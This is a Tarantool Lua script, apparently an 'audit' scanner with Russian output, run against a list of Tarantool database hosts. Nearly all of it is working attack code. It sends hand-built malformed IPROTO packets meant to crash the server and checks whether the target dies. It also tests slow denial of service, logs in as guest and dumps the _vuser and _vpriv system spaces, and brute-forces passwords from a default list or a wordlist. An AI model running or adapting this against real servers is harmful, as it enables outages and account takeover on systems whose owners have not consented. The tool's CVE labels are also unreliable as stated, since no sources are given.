#!/usr/bin/env tarantool
local net_box = require('net.box')
local fiber = require('fiber')
local socket = require('socket')
local fio = require('fio')
local bit = require('bit')

local DEFAULT_PORT = 3301

local DEFAULT_PASSWORDS = {
    "admin", "tarantool", "password", "secret", "root",
    "admin123", "qwe123_tnt", "tnt_admin"
}

-- безопасное преобразование любого значения в строку
local function safe_tostring(v)
    local t = type(v)
    if t == "nil" then
        return "nil"
    elseif t == "boolean" or t == "number" then
        return tostring(v)
    elseif t == "string" then
        return v
    elseif t == "table" then
        return "{table}"
    elseif t == "function" then
        return "{function}"
    elseif t == "thread" then
        return "{thread}"
    elseif t == "userdata" then
        return "{userdata}"
    elseif t == "cdata" then
        return "{cdata}"
    else
        return "?"
    end
end

-- безопасная сериализация строки таблицы (только для примитивов)
local function safe_row_concat(row, max_fields)
    max_fields = max_fields or 10
    local parts = {}
    for i = 1, math.min(#row, max_fields) do
        parts[i] = safe_tostring(row[i])
    end
    if #row > max_fields then
        table.insert(parts, "...")
    end
    return table.concat(parts, " | ")
end

local function print_usage()
    print("Использование: tarantool scanner_v10.lua <файл_с_хостами> [опции]")
    print("Или:          tarantool scanner_v10.lua -i <хост:порт> [опции]")
    print("Опции:")
    print("  -i <host:port> Одиночный целевой хост для сканирования")
    print("  -u <user>      Имя пользователя для брутфорса (по умолчанию: admin)")
    print("  -p <pass/file> Конкретный пароль ИЛИ путь к файлу со словарем паролей")
    print("  -h, --help     Показать эту справку")
    os.exit(0)
end

local function parse_host_string(line)
    line = line:gsub("%s+", "")
    if line ~= "" and not line:match("^#") then
        local host, port = line:match("^([^:]+):?(%d*)$")
        if host then
            port = (port ~= "") and tonumber(port) or DEFAULT_PORT
            return {host = host, port = port}
        end
    end
    return nil
end

local function parse_args()
    local args = arg
    if #args == 0 or args[1] == "-h" or args[1] == "--help" then print_usage() end

    local config = { hosts_file = nil, single_host = nil, user = "admin", passwords = DEFAULT_PASSWORDS }
    
    local i = 1
    if args and args[1] and not args[1]:match("^%-") then
        config.hosts_file = args[1]
        i = 2
    end

    while i <= #args do
        if args[i] == "-i" then
            if not args[i+1] then print("[-] Ошибка: пропущен хост после -i"); os.exit(1) end
            config.single_host = args[i+1]
            i = i + 2
        elseif args[i] == "-u" then
            if not args[i+1] then print("[-] Ошибка: пропущен user после -u"); os.exit(1) end
            config.user = args[i+1]
            i = i + 2
        elseif args[i] == "-p" then
            local p_val = args[i+1]
            if not p_val then print("[-] Ошибка: пропущен пароль/файл после -p"); os.exit(1) end
            if fio.path.exists(p_val) then
                local pf = fio.open(p_val, {'O_RDONLY'})
                local p_buf = pf:read(65536)
                pf:close()
                config.passwords = {}
                for line in string.gmatch(p_buf, "[^\r\n]+") do
                    line = line:gsub("%s+", "")
                    if line ~= "" then table.insert(config.passwords, line) end
                end
            else
                config.passwords = { p_val }
            end
            i = i + 2
        else
            if not config.hosts_file and not args[i]:match("^%-") then
                config.hosts_file = args[i]
                i = i + 1
            else
                print("[-] Неизвестный параметр: " .. tostring(args[i]))
                print_usage()
            end
        end
    end

    if not config.hosts_file and not config.single_host then
        print("[-] Ошибка: Не указан ни файл с хостами, ни одиночный целевой хост через -i")
        print_usage()
    end

    return config
end

local function load_hosts(config)
    local hosts = {}
    if config.single_host then
        local parsed = parse_host_string(config.single_host)
        if parsed then
            table.insert(hosts, parsed)
        else
            print("[-] Ошибка: Неверный формат хоста в -i: " .. tostring(config.single_host))
            os.exit(1)
        end
    end
    if config.hosts_file then
        if not fio.path.exists(config.hosts_file) then
            print("[-] Ошибка: Файл с хостами не найден: " .. tostring(config.hosts_file))
            os.exit(1)
        end
        local fh = fio.open(config.hosts_file, {'O_RDONLY'})
        local buf = fh:read(32768)
        fh:close()
        for line in string.gmatch(buf, "[^\r\n]+") do
            local parsed = parse_host_string(line)
            if parsed then table.insert(hosts, parsed) end
        end
    end
    return hosts
end

local function decode_priv(priv_num)
    local r = {}
    if bit.band(priv_num, 1) ~= 0 then table.insert(r, "READ") end
    if bit.band(priv_num, 2) ~= 0 then table.insert(r, "WRITE") end
    if bit.band(priv_num, 4) ~= 0 then table.insert(r, "EXECUTE") end
    if bit.band(priv_num, 8) ~= 0 then table.insert(r, "CREATE") end
    if bit.band(priv_num, 16) ~= 0 then table.insert(r, "DROP") end
    if bit.band(priv_num, 32) ~= 0 then table.insert(r, "ALTER") end
    return #r == 0 and "NONE" or table.concat(r, "|")
end

local function make_malformed_iproto()
    local header = string.char(0xce, 0x00, 0x00, 0x00, 0x01, 0x01, 0x0a)
    local body = string.char(0x81, 0x22, 0x90)
    return string.char(0xce, 0x00, 0x00, 0x00, #header + #body) .. header .. body
end

local function make_bad_datetime_iproto()
    local header = string.char(0xce, 0x00, 0x00, 0x00, 0x02, 0x01, 0x0a)
    local body = string.char(0x82, 0x22, 0xa4, 0x74, 0x65, 0x73, 0x74, 0x23, 0x81, 0xff, 0xff)
    return string.char(0xce, 0x00, 0x00, 0x00, #header + #body) .. header .. body
end

local function check_cve_banner(version_str)
    if not version_str or version_str == "unknown" then return "Низкий риск (версия скрыта)" end
    local major, minor, patch = version_str:match("(%d+)%.(%d+)%.(%d+)")
    major, minor, patch = tonumber(major), tonumber(minor), tonumber(patch)
    if not major then return "Кастомная сборка (требуется ручной анализ)" end
    
    if major == 1 then
        return "CRITICAL (EOL): Уязвима к Msgpuck DoS и старым CVE-2021-43523."
    elseif major == 2 then
        if minor <= 6 then
            return "HIGH: Обход песочниц и утечки памяти в сессиях."
        elseif minor == 7 or minor == 8 then
            return "HIGH: Краш инстанса пакетом нулевой длины (IPROTO DoS)."
        elseif minor == 10 and patch < 5 then
            return "MEDIUM: Старый релиз 2.10. Утечки дескрипторов."
        elseif minor == 11 and patch == 0 then
            return "MEDIUM (2.11.0): Известны логические баги парсинга IPROTO, DateTime-баг CVE-2025-6536."
        end
    end
    return "Низкий риск (известных RCE нет)"
end

local function brute_force(host, port, username, password_list)
    for _, pass in ipairs(password_list) do
        local c = net_box.connect(host .. ":" .. port, {user = username, password = pass, wait_connected = false})
        if c:wait_connected(3.0) then
            local ok, res = pcall(function() return c:eval("return box.session.user()") end)
            c:close()
            if ok and res == username then return pass end
        end
    end
    return nil
end

local function audit_worker(target, config, channel)
    local report = { host = target.host, port = target.port, online = false, logs = {} }

    local sock, _ = socket.tcp_connect(target.host, target.port, 10.0)
    if not sock then
        table.insert(report.logs, "[-] СТАТУС: Хост недоступен по сети.")
        channel:put(report)
        return
    end
    
    report.online = true
    local greeting = sock:read(64, 5.0)
    local version = greeting and greeting:match("Tarantool%s+([%d%.%-%w]+)") or "unknown"
    table.insert(report.logs, string.format("[v] ВЕРСИЯ: %s -> %s", version, check_cve_banner(version)))

    fiber.sleep(1.0)
    local slow_dos = sock:write("\x00", 1.0)
    sock:close()
    
    if slow_dos then
        table.insert(report.logs, "[!!!] КРИТИЧНОСТЬ (HIGH): Уязвим к Slow-DoS (Fiber Leak). Держит мертвые сессии.")
    else
        table.insert(report.logs, "[✓] СЕТЬ: Мертвые TCP-сессии сбрасываются таймаутом.")
    end

    local function test_packet(packet_payload, cve_label)
        local s = socket.tcp_connect(target.host, target.port, 5.0)
        if s then
            s:read(64, 2.0)
            s:write(packet_payload, 2.0)
            local r = s:read(128, 5.0)
            s:close()
            if not r or #r == 0 then
                local chk = socket.tcp_connect(target.host, target.port, 3.0)
                if not chk then
                    return string.format("[!!!] КРИТИЧНОСТЬ (CRITICAL): Сработал удаленный Crash через %s!", cve_label)
                else
                    chk:close()
                    return string.format("[!] ПРЕДУПРЕЖДЕНИЕ: Сервер оборвал соединение на %s (Потенциальный баг парсера).", cve_label)
                end
            end
        end
        return nil
    end

    local iproto_err = test_packet(make_malformed_iproto(), "CVE-2023-45159 (Malformed MsgPack)")
    if iproto_err then table.insert(report.logs, iproto_err) end

    local datetime_err = test_packet(make_bad_datetime_iproto(), "CVE-2025-6536 (DateTime Crash)")
    if datetime_err then table.insert(report.logs, datetime_err) end

    table.insert(report.logs, "[*] Проверка гостевого доступа (guest)...")
    local c = net_box.connect(target.host .. ":" .. target.port, {user = "guest", password = "", wait_connected = false})
    if c:wait_connected(5.0) then
        table.insert(report.logs, "[!] Доступ под пользователем 'guest' разрешен без пароля!")
        
        -- Чтение _vuser (безопасно)
        local vuser_ok, vuser_data = pcall(function()
            return c.space._vuser:select({}, {limit = 5})
        end)
        if vuser_ok and vuser_data and #vuser_data > 0 then
            table.insert(report.logs, "[!!!] LPE КРИТИЧНОСТЬ: Доступно чтение системного спейса _vuser!")
            table.insert(report.logs, "    Содержимое _vuser (первые " .. #vuser_data .. " записей):")
            for _, row in ipairs(vuser_data) do
                table.insert(report.logs, "      " .. safe_row_concat(row, 8))
            end
        elseif vuser_ok then
            table.insert(report.logs, "    _vuser спейс пуст или нет записей.")
        else
            table.insert(report.logs, "    Не удалось прочитать _vuser (ошибка доступа или прав).")
        end

        -- Чтение _vpriv (безопасно)
        local vpriv_ok, vpriv_data = pcall(function()
            return c.space._vpriv:select({}, {limit = 5})
        end)
        if vpriv_ok and vpriv_data and #vpriv_data > 0 then
            table.insert(report.logs, "[!!!] LPE КРИТИЧНОСТЬ: Доступно чтение системного спейса _vpriv!")
            table.insert(report.logs, "    Содержимое _vpriv (первые " .. #vpriv_data .. " записей):")
            for _, row in ipairs(vpriv_data) do
                table.insert(report.logs, "      " .. safe_row_concat(row, 8))
            end
        elseif vpriv_ok then
            table.insert(report.logs, "    _vpriv спейс пуст или нет записей.")
        else
            table.insert(report.logs, "    Не удалось прочитать _vpriv (ошибка доступа или прав).")
        end
        
        c:close()
    else
        table.insert(report.logs, "[✓] Гостевой доступ заблокирован/требует пароль.")
    end

    table.insert(report.logs, string.format("[*] Запуск брутфорса для пользователя '%s'...", config.user))
    local valid_pass = brute_force(target.host, target.port, config.user, config.passwords)
    if valid_pass then
        table.insert(report.logs, string.format("[+++] УСПЕХ: Найдены учетные данные -> %s : %s", config.user, valid_pass))
    else
        table.insert(report.logs, "[-] Брутфорс завершен. Валидных паролей не найдено.")
    end

    channel:put(report)
end

-- ==========================================
-- Основной цикл выполнения
-- ==========================================

local config = parse_args()
local targets = load_hosts(config)

print(string.format("[*] Загружено целей для сканирования: %d", #targets))

if #targets == 0 then
    print("[-] Нет доступных целей для сканирования.")
    os.exit(0)
end

local channel = fiber.channel(#targets)
print("[*] Запуск сканирования целей...\n")

for _, target in ipairs(targets) do
    fiber.create(audit_worker, target, config, channel)
end

for i = 1, #targets do
    local report = channel:get()
    if report then
        print(string.format("========================================"))
        print(string.format("[+] РЕЗУЛЬТАТ ДЛЯ %s:%d", report.host, report.port))
        print(string.format("========================================"))
        for _, log_entry in ipairs(report.logs) do
            print("  " .. log_entry)
        end
        print()
    end
end

print("[*] Сканирование полностью завершено.")
os.exit(0)
